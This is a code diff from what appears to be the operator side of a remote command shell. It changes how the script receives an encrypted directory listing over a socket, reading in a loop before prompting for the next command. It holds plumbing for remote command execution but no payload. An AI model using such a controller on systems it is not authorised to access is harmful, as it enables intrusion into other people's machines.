@@ -87,8 +87,20 @@ def main():
         try:
             while True:
                 connection.send(encryption_handler('directory', encode=True))
-                directory = connection.recv(1024)
-                directory = encryption_handler(directory, decode=True)
+                directory = b''
+                while True:
+                    try:
+                        directory = directory + connection.recv(1024)
+                        if not directory:
+                            break
+                        if directory[-1] == 34:
+                            break
+                    except ValueError:
+                        continue
+                try:
+                    directory = encryption_handler(directory, decode=True)
+                except json.decoder.JSONDecodeError:
+                    continue
                 command = input(f'{directory} ')
                 if command.lower().strip() == 'exit':
                     connection.send(encryption_handler('exit', encode=True))
